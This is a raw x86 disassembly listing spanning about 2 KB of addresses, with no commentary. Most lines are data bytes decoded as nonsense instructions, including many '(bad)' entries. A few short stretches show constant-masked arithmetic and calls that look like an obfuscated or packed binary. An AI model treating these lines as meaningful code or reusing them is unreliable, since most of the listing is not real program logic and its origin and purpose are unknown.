  40cf89:	push   ds
  40cf8a:	mov    eax,ds:0x89ebafd3
  40cf8f:	sub    eax,0xd3c5c4b6
  40cf94:	lods   eax,DWORD PTR ds:[esi]
  40cf95:	inc    ebp
  40cf96:	aam    0x5
  40cf98:	push   ebx
  40cf99:	stos   BYTE PTR es:[edi],al
  40cf9a:	ja     0x40cf87
  40cf9c:	das    
  40cf9d:	jno    0x40cf57
  40cf9f:	inc    ebx
  40cfa0:	xor    edi,DWORD PTR [ecx-0x72]
  40cfa3:	(bad)  
  40cfa4:	pop    esi
  40cfa5:	push   cs
  40cfa6:	jge    0x40cfec
  40cfa8:	or     BYTE PTR [eax+0x4c],ah
  40cfab:	cmp    DWORD PTR [eax-0x3194f612],edi
  40cfb1:	xlat   BYTE PTR ds:[ebx]
  40cfb2:	dec    ebx
  40cfb3:	aas    
  40cfb4:	std    
  40cfb5:	or     eax,ecx
  40cfb7:	xchg   BYTE PTR [edx],cl
  40cfb9:	scas   eax,DWORD PTR es:[edi]
  40cfba:	das    
  40cfbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfbc:	fldenv [edx-0x7f07b261]
  40cfc2:	mov    bh,BYTE PTR gs:[eax]
  40cfc5:	jo     0x40cf6e
  40cfc7:	iret   
  40cfc8:	test   BYTE PTR [ecx-0x69],ah
  40cfcb:	sbb    BYTE PTR [edx-0x31],bh
  40cfce:	mov    esi,0x10bfc8a7
  40cfd3:	test   eax,0xa712933f
  40cfd8:	add    ah,0x5c
  40cfdb:	add    BYTE PTR [esi+edi*8-0x64db872a],ah
  40cfe2:	push   ecx
  40cfe3:	icebp  
  40cfe4:	ret    0xb056
  40cfe7:	daa    
  40cfe8:	imul   esi,DWORD PTR [ebp+0xa],0x51
  40cfec:	rcr    ebx,1
  40cfee:	push   edi
  40cfef:	stos   DWORD PTR es:[edi],eax
  40cff0:	cdq    
  40cff1:	adc    edi,DWORD PTR [esi+edx*1]
  40cff4:	add    ebp,ebp
  40cff6:	daa    
  40cff7:	ds sti 
  40cff9:	mov    eax,ds:0xf56edf96
  40cffe:	cwde   
  40cfff:	jae    0x40d023
  40d001:	sub    BYTE PTR [esi],dh
  40d003:	or     BYTE PTR [ebp+0x42],ah
  40d006:	(bad)  
  40d008:	lods   al,BYTE PTR ds:[esi]
  40d009:	in     eax,0x15
  40d00b:	lahf   
  40d00c:	mov    al,BYTE PTR [ecx-0x75]
  40d00f:	adc    al,0xea
  40d011:	push   cs
  40d012:	and    BYTE PTR [esi-0x1e],al
  40d015:	(bad)  
  40d016:	cmp    edi,DWORD PTR [ebp+0x10]
  40d019:	cmc    
  40d01a:	pop    ecx
  40d01b:	or     BYTE PTR [edi],ch
  40d01d:	mov    eax,0x9aa72612
  40d022:	add    ah,BYTE PTR [edx+ebp*4-0x4b]
  40d026:	(bad)  
  40d028:	shl    BYTE PTR [edx+0x139d995a],cl
  40d02e:	les    ebp,FWORD PTR [ebx]
  40d030:	call   0x3fc5:0xb4e5ed0e
  40d037:	and    dh,BYTE PTR [ebp-0x6d]
  40d03a:	and    eax,0xe64a242c
  40d03f:	mov    ds:0x8eff39dc,eax
  40d044:	mov    al,BYTE PTR [esi+0x72bc3aa]
  40d04a:	fistp  WORD PTR [esi+0x6501e085]
  40d050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d051:	xchg   ebp,eax
  40d052:	rcr    BYTE PTR [eax*2+0x4c6f1434],0x66
  40d05a:	loop   0x40d095
  40d05c:	pop    esp
  40d05d:	add    DWORD PTR [edi],esp
  40d05f:	or     BYTE PTR [esi+0x36],al
  40d062:	popf   
  40d063:	fld    DWORD PTR ss:[esi-0x482d14fe]
  40d06a:	gs ins BYTE PTR es:[edi],dx
  40d06c:	or     cl,dl
  40d06e:	loop   0x40d0df
  40d070:	lea    ecx,fs:[edx+0x41]
  40d074:	fucom  st(7)
  40d076:	addr16 mov esi,0xc1040e59
  40d07c:	data16 sub BYTE PTR [eax+ebx*2-0x76],al
  40d081:	outs   dx,BYTE PTR ds:[esi]
  40d082:	repnz adc al,0x18
  40d085:	sbb    eax,0x1526aee1
  40d08a:	xchg   edi,eax
  40d08b:	push   ebp
  40d08c:	xchg   esp,eax
  40d08d:	icebp  
  40d08e:	(bad)  
  40d08f:	fmulp  st(3),st
  40d091:	adc    edi,DWORD PTR [ebx-0x40fada20]
  40d097:	push   edi
  40d098:	popa   
  40d099:	xchg   ebx,eax
  40d09a:	call   0x2e01:0x2cd20bf0
  40d0a1:	dec    eax
  40d0a2:	outs   dx,DWORD PTR ds:[esi]
  40d0a3:	fimul  DWORD PTR [esi+0x40702de9]
  40d0a9:	(bad)  
  40d0aa:	test   DWORD PTR [edx+0x53],esi
  40d0ad:	(bad)  
  40d0ae:	(bad)
  40d0b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0b3:	out    0xd7,al
  40d0b5:	mov    ebx,0x83d9042b
  40d0ba:	mov    dl,0x93
  40d0bc:	sub    al,0x64
  40d0be:	js     0x40d120
  40d0c0:	and    al,0xa7
  40d0c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0c3:	outs   dx,DWORD PTR ds:[esi]
  40d0c4:	adc    ch,BYTE PTR [ebp-0x3c]
  40d0c7:	(bad)  
  40d0c9:	pop    ecx
  40d0ca:	(bad)  
  40d0cc:	push   ds
  40d0cd:	ret    0x83c2
  40d0d0:	pop    ecx
  40d0d1:	stos   DWORD PTR es:[edi],eax
  40d0d2:	inc    ebx
  40d0d3:	mov    ecx,0x9bd0846a
  40d0d8:	jmp    0xd2c2fe7b
  40d0dd:	cld    
  40d0de:	mov    BYTE PTR [ebp-0x14],bh
  40d0e1:	or     cl,BYTE PTR [edx-0x36bba49f]
  40d0e7:	lock fidiv WORD PTR [esi+ecx*8]
  40d0eb:	cwde   
  40d0ec:	pop    edi
  40d0ed:	iret   
  40d0ee:	out    0xc,eax
  40d0f0:	jo     0x40d072
  40d0f2:	int3   
  40d0f3:	inc    ebp
  40d0f4:	hlt    
  40d0f5:	mov    edx,0xfd724d6d
  40d0fa:	outs   dx,BYTE PTR ds:[esi]
  40d0fb:	and    al,0x9b
  40d0fd:	mov    ebx,0x8cad48b0
  40d102:	sub    eax,0xf746292a
  40d107:	pusha  
  40d108:	out    0x4d,al
  40d10a:	in     eax,0x9b
  40d10c:	pushf  
  40d10d:	idiv   DWORD PTR [edi-0x26]
  40d110:	jmp    0x40d18b
  40d112:	sbb    eax,0x4fe6048b
  40d117:	mov    al,0xcd
  40d119:	and    eax,0xa21dd7be
  40d11e:	xchg   ecx,eax
  40d11f:	pop    eax
  40d120:	hlt    
  40d121:	xchg   esi,eax
  40d122:	sbb    BYTE PTR [ebp-0x45],cl
  40d125:	clc    
  40d126:	clc    
  40d127:	or     BYTE PTR [edx+0x1b],0x1
  40d12b:	test   al,0x53
  40d12d:	fcomp  QWORD PTR [ebx+ebp*1]
  40d130:	mov    DWORD PTR [edi],ebp
  40d132:	ja     0x40d18b
  40d134:	fnstcw WORD PTR [ebx-0x15]
  40d137:	(bad)  
  40d138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d139:	jg     0x40d151
  40d13b:	(bad)  
  40d13c:	dec    edx
  40d13d:	cwde   
  40d13e:	mov    ch,0xd3
  40d140:	jl     0x40d0eb
  40d142:	add    al,0x3b
  40d144:	push   ss
  40d145:	clc    
  40d146:	retf   
  40d147:	mov    ah,0x58
  40d149:	and    ecx,esi
  40d14b:	ja     0x40d1ae
  40d14d:	and    ebp,DWORD PTR [edi+0x44]
  40d150:	sub    al,0xd1
  40d152:	or     eax,0xf21a7622
  40d157:	jecxz  0x40d1c7
  40d159:	out    0xcb,al
  40d15b:	pop    ebx
  40d15c:	loop   0x40d12b
  40d15e:	stc    
  40d15f:	fisttp WORD PTR [ecx+0x5f7a2f09]
  40d165:	mov    ds,esi
  40d167:	push   cs
  40d168:	mov    BYTE PTR [edi+0x59b2bbbb],dh
  40d16e:	out    dx,eax
  40d16f:	inc    ebp
  40d170:	shr    BYTE PTR [ecx+0x46f0ad3b],1
  40d176:	lea    edi,[edi]
  40d178:	lahf   
  40d179:	sbb    DWORD PTR [ecx+0x21966677],ebp
  40d17f:	popa   
  40d180:	repz mov eax,ds:0xa614b1e3
  40d186:	nop
  40d187:	jb     0x40d1b5
  40d189:	pop    ebp
  40d18a:	mov    eax,ds:0xc5aebb24
  40d18f:	pop    esi
  40d190:	mov    dh,0x28
  40d192:	(bad)  
  40d193:	jb     0x40d166
  40d195:	int    0x41
  40d197:	scas   eax,DWORD PTR es:[edi]
  40d198:	mov    WORD PTR [esi],?
  40d19a:	(bad)  
  40d19b:	xor    edx,esi
  40d19d:	out    0x1e,eax
  40d19f:	call   0x1e9b:0x906c5356
  40d1a6:	imul   ecx,DWORD PTR [ebp+0x2546edaf],0xffffff97
  40d1ad:	pop    ss
  40d1ae:	jmp    0x1e4e:0xe570b3f3
  40d1b5:	add    cl,BYTE PTR [edx]
  40d1b7:	jnp    0x40d1a1
  40d1b9:	je     0x40d17e
  40d1bb:	xor    DWORD PTR [ebx+0x31],eax
  40d1be:	mov    bl,BYTE PTR [esi-0x57]
  40d1c1:	mov    esp,0x71f06b7f
  40d1c6:	push   ebp
  40d1c7:	fwait
  40d1c8:	repz inc esp
  40d1ca:	iret   
  40d1cb:	rol    DWORD PTR [esi+edi*1],0xef
  40d1cf:	dec    edi
  40d1d0:	stos   BYTE PTR es:[edi],al
  40d1d1:	or     dl,BYTE PTR ds:0x6a92f54d
  40d1d7:	inc    esp
  40d1d8:	pop    esp
  40d1d9:	retf   0x493
  40d1dc:	push   ds
  40d1dd:	stos   DWORD PTR es:[edi],eax
  40d1de:	jbe    0x40d216
  40d1e0:	aas    
  40d1e1:	pop    ecx
  40d1e2:	shr    dl,0xb1
  40d1e5:	mov    cl,0x21
  40d1e7:	pop    ebx
  40d1e8:	dec    esp
  40d1e9:	and    BYTE PTR [edi],ah
  40d1eb:	pop    ebx
  40d1ec:	bound  ebp,QWORD PTR [edi-0x644db4ea]
  40d1f2:	int3   
  40d1f3:	push   ebp
  40d1f4:	sbb    al,0x90
  40d1f6:	sbb    DWORD PTR [edx+0x74],esi
  40d1f9:	inc    ebp
  40d1fa:	aad    0x22
  40d1fc:	aaa    
  40d1fd:	(bad)  
  40d1fe:	pop    eax
  40d1ff:	push   ebp
  40d200:	aaa    
  40d201:	(bad)  
  40d202:	xlat   BYTE PTR ds:[ebx]
  40d203:	or     eax,0x23ea932b
  40d208:	adc    al,0xd3
  40d20a:	cs popa 
  40d20c:	std    
  40d20d:	frstor [ebx]
  40d20f:	xchg   edi,eax
  40d210:	(bad)  
  40d211:	pop    ecx
  40d212:	push   edx
  40d213:	inc    edi
  40d214:	push   eax
  40d215:	add    dh,BYTE PTR [edi]
  40d217:	fnsave [esi-0x59]
  40d21a:	fist   WORD PTR [ecx+0x24]
  40d21d:	push   es
  40d21e:	xchg   ecx,eax
  40d21f:	iret   
  40d220:	(bad)  
  40d221:	sbb    eax,0x5cad8bc5
  40d226:	sub    ebx,DWORD PTR [ebx+edx*8+0x42a283f2]
  40d22d:	inc    edi
  40d22e:	mov    DWORD PTR [ebp-0x20],0x5093
  40d235:	mov    DWORD PTR [ebp-0x1c],0x2d608
  40d23c:	mov    DWORD PTR [ebp-0x18],0x3194
  40d243:	mov    DWORD PTR [ebp-0x14],0x382a
  40d24a:	push   0x6a7c
  40d24f:	mov    DWORD PTR [ebp-0x10],0x5984
  40d256:	mov    eax,DWORD PTR [ebp-0x28]
  40d259:	mov    ecx,DWORD PTR [ebp-0x24]
  40d25c:	push   0x5694
  40d261:	push   ecx
  40d262:	push   eax
  40d263:	call   0x421ba4
  40d268:	mov    ecx,DWORD PTR [ebp-0x30]
  40d26b:	mov    edi,DWORD PTR [ebp-0x2c]
  40d26e:	push   edi
  40d26f:	push   ecx
  40d270:	push   edx
  40d271:	push   eax
  40d272:	call   0x418100
  40d277:	mov    ecx,eax
  40d279:	mov    eax,DWORD PTR [ebp-0x38]
  40d27c:	mov    edi,edx
  40d27e:	mov    edx,DWORD PTR [ebp-0x34]
  40d281:	xor    edi,0x296f
  40d287:	xor    ecx,0x20bb
  40d28d:	add    ecx,0x720a
  40d293:	adc    edi,0x1e7d
  40d299:	or     ecx,eax
  40d29b:	mov    eax,ds:0x4222a8
  40d2a0:	mov    eax,DWORD PTR [eax+0x1d8]
  40d2a6:	mov    eax,DWORD PTR [eax]
  40d2a8:	or     edi,edx
  40d2aa:	add    ecx,0xffff107b
  40d2b0:	cdq    
  40d2b1:	jmp    0x40d66c
  40d2b6:	adc    ah,BYTE PTR [edi]
  40d2b8:	fnstsw WORD PTR [ebp+edi*8-0x30524d43]
  40d2bf:	js     0x40d326
  40d2c1:	xor    DWORD PTR [edi-0x1b],esp
  40d2c4:	push   DWORD PTR [ecx-0x35]
  40d2c7:	fidivr WORD PTR [ebx-0x443a1045]
  40d2cd:	mov    ebx,0x3bd66da9
  40d2d2:	loopne 0x40d335
  40d2d4:	or     eax,0xfc954da
  40d2d9:	repz mov ah,0xed
  40d2dc:	leave  
  40d2dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2de:	nop
  40d2df:	test   DWORD PTR [eax],ebp
  40d2e1:	jp     0x40d35b
  40d2e3:	outs   dx,DWORD PTR ds:[esi]
  40d2e4:	loopne 0x40d2fb
  40d2e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2e7:	ins    BYTE PTR es:[edi],dx
  40d2e8:	jno    0x40d330
  40d2ea:	add    esp,DWORD PTR [edx]
  40d2ec:	pop    ss
  40d2ed:	jp     0x40d2f2
  40d2ef:	jne    0x40d30b
  40d2f1:	pop    edx
  40d2f2:	sahf   
  40d2f3:	or     al,0x8f
  40d2f5:	fdiv   DWORD PTR [ebp+0x2d49bdf1]
  40d2fb:	fcmovnb st,st(2)
  40d2fd:	out    dx,al
  40d2fe:	inc    esp
  40d2ff:	mov    ds:0x810b6337,eax
  40d304:	or     DWORD PTR [edi],0x37
  40d307:	jae    0x40d2b4
  40d309:	out    dx,al
  40d30a:	push   cs
  40d30b:	add    BYTE PTR [eax+0x1988d102],ah
  40d311:	std    
  40d312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d313:	mov    eax,ds:0x48b17224
  40d318:	loope  0x40d2c8
  40d31a:	lahf   
  40d31b:	nop
  40d31c:	pop    esi
  40d31d:	mov    ds:0x6c59036c,al
  40d322:	daa    
  40d323:	xchg   BYTE PTR [ebx+0x42],dh
  40d326:	jmp    0x6ae64ada
  40d32b:	sub    DWORD PTR [edi],eax
  40d32d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d32e:	push   ecx
  40d32f:	iret   
  40d330:	push   ebx
  40d331:	lea    edi,[eax+0x1e210a16]
  40d337:	sub    edx,DWORD PTR [ecx+0x32]
  40d33a:	cmp    BYTE PTR [edi],0xa0
  40d33d:	add    bp,0xfff1
  40d341:	repnz xchg esp,eax
  40d343:	add    BYTE PTR [esi-0x16],cl
  40d346:	pop    ebx
  40d347:	jmp    0x40d2eb
  40d349:	sbb    cl,BYTE PTR [ecx+0x2c]
  40d34c:	jge    0x40d3b2
  40d34e:	mov    bh,0xf5
  40d350:	mov    ds:0xdeb6f035,eax
  40d355:	mov    eax,DWORD PTR [ebp-0x77]
  40d358:	lods   eax,DWORD PTR ds:[esi]
  40d359:	pop    edx
  40d35a:	js     0x40d3a6
  40d35c:	call   0x1d23:0x946ede62
  40d363:	fldenv [ebx-0x69fe51d9]
  40d369:	mov    esp,0x41cbee6
  40d36e:	scas   eax,DWORD PTR es:[edi]
  40d36f:	dec    eax
  40d370:	adc    eax,0x126e0d3a
  40d375:	xchg   DWORD PTR [edi+0x42],ecx
  40d378:	jo     0x40d3a9
  40d37a:	repnz hlt 
  40d37c:	pop    ds
  40d37d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d37e:	mov    DWORD PTR [ebx-0x7a],0x986dbeec
  40d385:	aas    
  40d386:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d388:	and    al,BYTE PTR [ebp-0x25997a82]
  40d38e:	mov    esi,0x9fd42e98
  40d393:	aam    0x37
  40d395:	aaa    
  40d396:	ins    BYTE PTR es:[edi],dx
  40d397:	arpl   WORD PTR [edi+0x63a70e6d],sp
  40d39d:	fwait
  40d39e:	pop    ebp
  40d39f:	das    
  40d3a0:	add    DWORD PTR [esi+0x36743d79],0x4a148600
  40d3aa:	in     eax,dx
  40d3ab:	stos   BYTE PTR es:[edi],al
  40d3ac:	repz pop ebx
  40d3ae:	sbb    eax,0xcc92d4d9
  40d3b3:	out    dx,eax
  40d3b4:	adc    al,0xa4
  40d3b6:	jmp    0x603d:0x4d61e71a
  40d3bd:	fwait
  40d3be:	cmp    eax,0xf9395270
  40d3c3:	lds    edx,FWORD PTR [ecx+0x3a]
  40d3c6:	and    bh,bl
  40d3c8:	sub    BYTE PTR [eax+0x7b],0x94
  40d3cc:	sub    eax,0xc816f967
  40d3d1:	inc    ecx
  40d3d2:	or     eax,0xeeb5a8f1
  40d3d7:	je     0x40d359
  40d3d9:	sbb    eax,0x40570620
  40d3de:	or     BYTE PTR [ebx],bl
  40d3e0:	ror    BYTE PTR [eax+0x1b10309c],cl
  40d3e6:	in     al,dx
  40d3e7:	iret   
  40d3e8:	cmp    ecx,DWORD PTR [ebx+edi*8+0x47f77352]
  40d3ef:	mov    eax,ds:0x48103fd8
  40d3f4:	stc    
  40d3f5:	mov    ds:0x50f1cf3e,al
  40d3fa:	sbb    edi,DWORD PTR [ecx]
  40d3fc:	test   eax,0xe16da64c
  40d401:	jge    0x40d42a
  40d403:	gs mov ebp,0xbc1bce11
  40d409:	jnp    0x40d38e
  40d40b:	aam    0x5d
  40d40d:	(bad)  
  40d40e:	aad    0xe8
  40d410:	sbb    BYTE PTR [eax+ecx*8],0xd7
  40d414:	retf   0xde42
  40d417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d418:	mov    eax,ds:0x5982c38b
  40d41d:	retf   0x49a6
  40d420:	stc    
  40d421:	cmp    al,0xbb
  40d423:	stos   DWORD PTR es:[edi],eax
  40d424:	test   eax,0x65b5d767
  40d429:	lods   al,BYTE PTR ds:[esi]
  40d42a:	int3   
  40d42b:	sub    bl,dh
  40d42d:	pop    esp
  40d42e:	mov    al,ds:0x329e7ec1
  40d433:	and    BYTE PTR [ecx-0x46cc4522],0x75
  40d43a:	sbb    esi,DWORD PTR [ebx]
  40d43c:	or     eax,0x54c5b102
  40d441:	cmp    eax,0xb8f3ae95
  40d446:	inc    ebp
  40d447:	test   ecx,0xdab19385
  40d44d:	mov    DWORD PTR [edi+0x17],ecx
  40d450:	or     DWORD PTR [edi-0x33bf29b8],esp
  40d456:	div    DWORD PTR [ebx]
  40d458:	lods   eax,DWORD PTR ds:[esi]
  40d459:	adc    eax,0x55db0264
  40d45e:	sbb    edi,DWORD PTR [esi-0x68]
  40d461:	mov    al,ds:0x88e84f3d
  40d466:	pop    edx
  40d467:	mov    bh,0xbe
  40d469:	sub    ebp,edx
  40d46b:	cmp    al,BYTE PTR [esi]
  40d46d:	bound  esi,QWORD PTR [eax+0x75]
  40d470:	test   al,0x3b
  40d472:	stos   DWORD PTR es:[edi],eax
  40d473:	lods   al,BYTE PTR ds:[esi]
  40d474:	in     eax,dx
  40d475:	in     eax,0x13
  40d477:	mov    gs,WORD PTR [esi+0x157167ca]
  40d47d:	cmp    dh,dl
  40d47f:	push   0x86a554e4
  40d484:	cwde   
  40d485:	in     eax,dx
  40d486:	popa   
  40d487:	(bad)  
  40d488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d489:	dec    esp
  40d48a:	pop    es
  40d48b:	je     0x40d501
  40d48d:	and    DWORD PTR [edx],edx
  40d48f:	ret    
  40d490:	daa    
  40d491:	jmp    0x9bb4114e
  40d496:	sub    DWORD PTR [esi+0x72],esp
  40d499:	mov    eax,ds:0xab05a8b1
  40d49e:	outs   dx,BYTE PTR ds:[esi]
  40d49f:	js     0x40d4f2
  40d4a1:	ins    DWORD PTR es:[edi],dx
  40d4a2:	or     eax,0xb6e2c78f
  40d4a7:	inc    eax
  40d4a8:	pop    ebx
  40d4a9:	not    DWORD PTR [eax+ecx*8]
  40d4ac:	push   edx
  40d4ad:	xchg   ecx,eax
  40d4ae:	in     al,0xbc
  40d4b0:	pop    esi
  40d4b1:	into   
  40d4b2:	xor    al,0xdc
  40d4b4:	call   0x7e231fe3
  40d4b9:	repnz mov esp,0xc3a6858f
  40d4bf:	test   DWORD PTR [edi+0x25],0xea5652d8
  40d4c6:	popa   
  40d4c7:	add    eax,0xe48d683c
  40d4cc:	push   ss
  40d4cd:	pop    ecx
  40d4ce:	adc    edx,DWORD PTR [edi-0x640a592e]
  40d4d4:	lods   al,BYTE PTR ds:[esi]
  40d4d5:	call   0x6f5e:0x44b66da4
  40d4dc:	inc    edi
  40d4dd:	(bad)  
  40d4de:	or     DWORD PTR [ebx+edi*1],eax
  40d4e1:	xor    esi,DWORD PTR [ebp+edx*2+0x11]
  40d4e5:	bound  ebp,QWORD PTR [esi]
  40d4e7:	xor    eax,0x8f7b8a17
  40d4ec:	or     DWORD PTR [ecx+0x45],esp
  40d4ef:	xchg   ecx,eax
  40d4f0:	sub    edx,edi
  40d4f2:	add    BYTE PTR [ebp+0x41c359b9],bl
  40d4f8:	ret    0x97cf
  40d4fb:	outs   dx,BYTE PTR ds:[esi]
  40d4fc:	enter  0x2672,0x6d
  40d500:	xor    eax,0x745b52df
  40d505:	xchg   esi,eax
  40d506:	stc    
  40d507:	pop    eax
  40d508:	mov    bl,0x10
  40d50a:	dec    ebp
  40d50b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d50c:	ret    0xa915
  40d50f:	add    edx,esp
  40d511:	jne    0x40d512
  40d513:	loopne 0x40d4ec
  40d515:	pop    ecx
  40d516:	outs   dx,BYTE PTR ds:[esi]
  40d517:	(bad)  
  40d518:	dec    edx
  40d519:	jne    0x40d4ba
  40d51b:	lahf   
  40d51c:	and    edx,DWORD PTR ds:0x7a9aa0a2
  40d522:	dec    ecx
  40d523:	sbb    al,0xd3
  40d525:	fwait
  40d526:	jl     0x40d4b9
  40d528:	test   ah,ah
  40d52a:	addr16 cmc 
  40d52c:	shl    BYTE PTR [ecx+edi*2-0x9],cl
  40d530:	dec    esi
  40d531:	lock lods al,BYTE PTR ds:[esi]
  40d533:	inc    eax
  40d534:	and    al,0x98
  40d536:	xchg   edx,eax
  40d537:	sbb    BYTE PTR [ecx-0x4b],cl
  40d53a:	sti    
  40d53b:	jbe    0x40d545
  40d53d:	push   edi
  40d53e:	jne    0x40d54f
  40d540:	pop    ds
  40d541:	addr16 (bad) 
  40d543:	push   0x62
  40d545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d546:	in     eax,0x34
  40d548:	or     dl,BYTE PTR [ebp+0x6ffe99c5]
  40d54e:	mov    ecx,0xbb10cc59
  40d553:	push   ss
  40d554:	popf   
  40d555:	sbb    DWORD PTR [eax-0x1d],edi
  40d558:	ins    DWORD PTR es:[edi],dx
  40d559:	push   edx
  40d55a:	and    DWORD PTR [edi-0x3],esp
  40d55d:	out    dx,eax
  40d55e:	sbb    DWORD PTR [eax],esi
  40d560:	inc    ebx
  40d561:	and    al,al
  40d563:	inc    eax
  40d564:	push   ds
  40d565:	add    DWORD PTR [edx+eiz*8],ecx
  40d568:	sahf   
  40d569:	addr16 jnp 0x40d5aa
  40d56c:	loope  0x40d56e
  40d56e:	stos   BYTE PTR es:[edi],al
  40d56f:	ret    0x4e6b
  40d572:	sbb    eax,0xa1a1c374
  40d577:	fucomip st,st(4)
  40d579:	rcl    DWORD PTR [ebx],1
  40d57b:	out    dx,al
  40d57c:	xchg   esp,eax
  40d57d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d57f:	pop    eax
  40d580:	or     eax,0x24950ce
  40d585:	push   edi
  40d586:	addr16 push edi
  40d588:	stos   BYTE PTR es:[edi],al
  40d589:	mov    edi,0xa13a290e
  40d58e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d58f:	pop    DWORD PTR [eax-0x13]
  40d592:	popf   
  40d593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d594:	xor    al,0x8d
  40d596:	jb     0x40d5d8
  40d598:	das    
  40d599:	mov    ch,0xcf
  40d59b:	pop    esp
  40d59c:	stos   BYTE PTR es:[edi],al
  40d59d:	ja     0x40d599
  40d59f:	clc    
  40d5a0:	scas   eax,DWORD PTR es:[edi]
  40d5a1:	mov    BYTE PTR gs:[esi+0x24],ah
  40d5a5:	mov    dh,0x9e
  40d5a7:	jl     0x40d58e
  40d5a9:	addr16 pop ebp
  40d5ab:	inc    ecx
  40d5ac:	clc    
  40d5ad:	fisubr WORD PTR [esp+esi*8]
  40d5b0:	cli    
  40d5b1:	sbb    eax,0x32ee27a8
  40d5b6:	scas   eax,DWORD PTR es:[edi]
  40d5b7:	scas   eax,DWORD PTR es:[edi]
  40d5b8:	mov    al,0xe5
  40d5ba:	call   0xbd8c:0x614edcd5
  40d5c1:	dec    edi
  40d5c2:	lods   al,BYTE PTR ds:[esi]
  40d5c3:	(bad)  [esi]
  40d5c5:	jmp    0x40d5f6
  40d5c7:	mov    ebp,0x3c823d82
  40d5cc:	into   
  40d5cd:	and    dh,BYTE PTR [edi+0xa381752]
  40d5d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5d4:	ret    0x91e
  40d5d7:	ret    
  40d5d8:	mov    DWORD PTR [ebp+ebp*2-0x1de1af5b],edx
  40d5df:	push   edx
  40d5e0:	dec    ebp
  40d5e1:	mov    ebx,0x66fb1bb9
  40d5e6:	xchg   DWORD PTR [esi+0x7f],esi
  40d5e9:	mov    ebx,0x623e7eac
  40d5ee:	mov    cl,0xc
  40d5f0:	pop    ds
  40d5f1:	xor    edi,DWORD PTR [ecx-0x74]
  40d5f4:	push   edi
  40d5f5:	(bad)  
  40d5f6:	mov    dh,0x8b
  40d5f8:	aam    0x38
  40d5fa:	in     eax,dx
  40d5fb:	cs lahf 
  40d5fd:	outs   dx,BYTE PTR ds:[esi]
  40d5fe:	(bad)  
  40d5ff:	imul   al
  40d601:	mov    edi,0xf5aba1c9
  40d606:	mov    esp,0xd465fa77
  40d60b:	mov    bh,0xe
  40d60d:	push   0xffffff87
  40d60f:	cmp    eax,0x236420
  40d614:	and    al,0xf0
  40d616:	fisttp QWORD PTR [esi-0x51]
  40d619:	ror    ch,0x9a
  40d61c:	jmp    0x3371:0xb14b985d
  40d623:	mov    al,ds:0xa60012bf
  40d628:	xchg   esp,eax
  40d629:	test   ah,ch
  40d62b:	xchg   esi,eax
  40d62c:	xchg   edx,eax
  40d62d:	cmp    cl,dh
  40d62f:	fdivr  QWORD PTR [ecx+0x9]
  40d632:	xchg   DWORD PTR [eax],ebx
  40d634:	pusha  
  40d635:	xor    bh,BYTE PTR [ecx+0x59]
  40d638:	xlat   BYTE PTR ds:[ebx]
  40d639:	call   0xba14:0x4c8735ff
  40d640:	jmp    0x5313:0x77cfb73d
  40d647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d648:	fstp   st(5)
  40d64a:	in     eax,0x91
  40d64c:	adc    DWORD PTR ds:0xfc0f,0xabe48377
  40d655:	cmp    DWORD PTR [ebx-0x1f],edx
  40d658:	mov    BYTE PTR [ebx+0x74],ah
  40d65b:	frstor [ebx+0x2f222a58]
  40d661:	cmc    
  40d662:	dec    edi
  40d663:	mov    eax,0x4ab8a1a2
  40d668:	dec    esp
  40d669:	test   al,0xda
  40d66b:	ja     0x40d5ee
  40d66d:	xlat   BYTE PTR ds:[ebx]
  40d66e:	adc    DWORD PTR [eax-0x3ec40001],esi
  40d674:	jne    0x40d682
  40d67a:	cmp    edx,edi
  40d67c:	je     0x40d6d4
  40d682:	mov    eax,ds:0x4225f8
  40d687:	mov    ecx,DWORD PTR ds:0x4225fc
  40d68d:	add    eax,0x7061
  40d692:	adc    ecx,0x6fc0
  40d698:	xor    ecx,0x632a
  40d69e:	push   ecx
  40d69f:	xor    eax,0x1fac
  40d6a4:	push   eax
  40d6a5:	push   0xba37
  40d6aa:	push   0x64ff
  40d6af:	call   0x418100
  40d6b4:	mov    ecx,DWORD PTR ds:0x4222a8
  40d6ba:	mov    ecx,DWORD PTR [ecx+0x1d0]
  40d6c0:	mov    ecx,DWORD PTR [ecx]
  40d6c2:	xor    edi,edi
  40d6c4:	cmp    ecx,eax
  40d6c6:	jne    0x40ea86
  40d6cc:	cmp    edi,edx
  40d6ce:	jne    0x40ea86
  40d6d4:	mov    eax,ds:0x422604
  40d6d9:	mov    ecx,DWORD PTR ds:0x422600
  40d6df:	xor    eax,0x36e1
  40d6e4:	add    eax,0xfffff66d
  40d6e9:	add    eax,ecx
  40d6eb:	jmp    0x40daa6
  40d6f0:	popf   
  40d6f1:	adc    DWORD PTR [edi-0x424ab962],edi
  40d6f7:	cmp    DWORD PTR [eax+0x2f3bc4b0],edx
  40d6fd:	or     BYTE PTR ds:0xbbe8ff71,al
  40d703:	mov    ebx,0xbbbbc5ef
  40d708:	dec    eax
  40d709:	xlat   BYTE PTR ds:[ebx]
  40d70a:	into   
  40d70b:	cmp    edx,ecx
  40d70d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d70e:	or     eax,DWORD PTR [eax+edi*4+0x3a]
  40d712:	addr16 out 0x7d,al
  40d715:	repnz inc DWORD PTR [edi+0x152d7ca8]
